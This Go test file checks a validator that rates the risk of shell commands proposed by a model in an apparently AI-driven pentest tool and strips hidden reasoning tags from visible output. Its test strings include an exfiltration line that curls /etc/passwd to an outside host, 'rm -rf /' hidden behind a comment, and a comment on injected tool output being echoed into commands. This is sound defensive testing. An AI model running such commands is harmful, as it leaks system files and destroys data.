package conductor

import (
	"testing"
)

// TestValidatorRiskPassthrough verifies that the model's declared risk_level
// is preserved by the validator (it is the primary source of truth).
// The backend does NOT classify by flag names — it trusts the model's output
// and only elevates risk if the command contains logical chain operators (&&/||).
func TestValidatorRiskPassthrough(t *testing.T) {
	v := NewValidator()

	resp := v.ValidateChatResponse(ChatResponse{
		Proposals: []Proposal{
			{Command: "nmap -sV 192.168.1.1", RiskLevel: "medium"},
			{Command: "sqlmap -u http://example.com --risk 3", RiskLevel: "high"},
			{Command: "ls -la", RiskLevel: "low"},
		},
	})

	if resp.Proposals[0].RiskLevel != "medium" {
		t.Errorf("model-declared medium risk should be preserved, got %s", resp.Proposals[0].RiskLevel)
	}
	if resp.Proposals[1].RiskLevel != "high" {
		t.Errorf("model-declared high risk should be preserved, got %s", resp.Proposals[1].RiskLevel)
	}
	if resp.Proposals[2].RiskLevel != "low" {
		t.Errorf("model-declared low risk should be preserved, got %s", resp.Proposals[2].RiskLevel)
	}
}

// TestValidatorApprovalRequired verifies that proposals with risk_level
// medium, high, or critical require approval, and low does not.
// Risk classification is model-supplied; the backend only enforces the threshold.
func TestValidatorApprovalRequired(t *testing.T) {
	v := NewValidator()

	resp := v.ValidateChatResponse(ChatResponse{
		Proposals: []Proposal{
			{Command: "subfinder -d example.com", RiskLevel: "low"},
			{Command: "nmap -sV -sC example.com", RiskLevel: "medium"},
		},
	})

	if resp.Proposals[0].RequiresApproval {
		t.Error("low risk should not require approval")
	}
	if !resp.Proposals[1].RequiresApproval {
		t.Error("medium risk should require approval")
	}
}

// TestValidatorEmptyCommandDropped ensures proposals with an empty/whitespace
// command are dropped with a warning.
func TestValidatorEmptyCommandDropped(t *testing.T) {
	v := NewValidator()

	resp := v.ValidateChatResponse(ChatResponse{
		Intent: "suggest_command",
		Proposals: []Proposal{
			{ID: "p1", Command: "   "},
			{ID: "p2", Command: ""},
		},
	})

	if len(resp.Proposals) != 0 {
		t.Errorf("expected empty-command proposals dropped, got %d", len(resp.Proposals))
	}
	if len(resp.Warnings) == 0 {
		t.Error("expected a warning about the empty command")
	}
}

func TestValidatorShellChainingEscalation(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		cmd  string
		want string
	}{
		{"ping 127.0.0.1; ping 8.8.8.8", "critical"},
		{"ping 127.0.0.1\nping 8.8.8.8", "critical"},
		{"nmap 10.0.0.1 | grep open", "critical"},
		{"echo `whoami`", "critical"},
		{"echo $(whoami)", "critical"},
		{"echo $target", "critical"},
		{"ping 10.0.0.1 && ping 10.0.0.2", "critical"},
		{"ping 10.0.0.1 || ping 10.0.0.2", "critical"},
		{"nmap 10.0.0.1", "low"},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			resp := v.ValidateChatResponse(ChatResponse{
				Proposals: []Proposal{
					{Command: tt.cmd, RiskLevel: "low"},
				},
			})
			if resp.Proposals[0].RiskLevel != tt.want {
				t.Errorf("expected risk level %s, got %s for %q", tt.want, resp.Proposals[0].RiskLevel, tt.cmd)
			}
		})
	}
}

// TestClassifyRiskAllowlistShape proves classifyRisk is a default-deny
// allowlist on command SHAPE, not a blacklist of specific bad characters.
// These cases cover structures the old "escalate on &&/||/;/|/`/$" blacklist
// would have missed entirely (a lone "&" backgrounds the command; ">"/"<"
// redirect; "()" opens a subshell; "#" starts a comment that can hide a
// trailing payload) — all are shell-significant and must NOT be "low" even
// though none of them are in that old fixed list. Conversely, the SAME bytes
// inside a quoted argument are inert data to the shell, so they don't
// escalate — proving the allowlist isn't simply a stricter blacklist either.
func TestClassifyRiskAllowlistShape(t *testing.T) {
	tests := []struct {
		cmd  string
		want string
	}{
		{"sleep 30 &", "critical"},              // lone background operator
		{"cat file.txt > /tmp/out", "critical"}, // output redirection
		{"cat < /etc/passwd", "critical"},       // input redirection
		{"(cd /tmp; ls)", "critical"},           // subshell
		{"echo hi # rm -rf /", "critical"},      // comment can hide a payload
		{"curl 'http://x/?a=1&b=2'", "low"},     // quoted: & is inert data
		{"grep \"a;b|c\" file.txt", "low"},      // quoted: ;| are inert data
		{"nmap -sV -p1-65535 10.0.0.1", "low"},  // ordinary flags/ranges
		{"sqlmap -u http://example.com --risk 3", "low"},
		{"gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt", "low"},
		// Regression: a single shell word can mix a bareword fragment directly
		// against a quoted fragment with no space between them (ordinary POSIX
		// word-splitting) — found live via an agent task proposing exactly this
		// command, which the allowlist regex was wrongly rejecting as "critical"
		// before it supported concatenated fragments within one token.
		{"cut -d':' -f1 /etc/passwd", "low"},
		{"awk -F':' '{print $1}' /etc/passwd", "low"},
		// Regression: unlike single quotes, bash DOES perform $()/backtick
		// command substitution and $VAR expansion inside double quotes — so
		// content inside "..." is NOT inert the way it is inside '...'. A
		// double-quoted payload containing a substitution must still
		// escalate, or an attacker-controlled fragment embedded in a
		// double-quoted argument (e.g. from injected tool output the model
		// echoes into a command) executes with no separate risk assessment.
		{`curl "http://good.com/$(cat /etc/passwd)"`, "critical"},
		{"echo \"`whoami`\"", "critical"},
		{"echo \"$HOME\"", "critical"},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := classifyRisk(tt.cmd); got != tt.want {
				t.Errorf("classifyRisk(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestValidateChatResponseStripsInternalReasoningFromVisibleFields(t *testing.T) {
	v := NewValidator()
	resp := v.ValidateChatResponse(ChatResponse{
		Message:  "<think>private chain</think>Operator-safe answer",
		TaskGoal: "<think>hidden plan</think>Assess the target",
		Proposals: []Proposal{{
			Command:   "nmap 127.0.0.1",
			Rationale: "[RUN_COMMAND]\n<think>secret</think>Service discovery",
			RiskLevel: "low",
		}},
	})

	if resp.Message != "Operator-safe answer" {
		t.Fatalf("visible message was not sanitized: %q", resp.Message)
	}
	if resp.TaskGoal != "Assess the target" {
		t.Fatalf("visible task goal was not sanitized: %q", resp.TaskGoal)
	}
	if resp.Proposals[0].Rationale != "Service discovery" {
		t.Fatalf("visible rationale was not sanitized: %q", resp.Proposals[0].Rationale)
	}
}
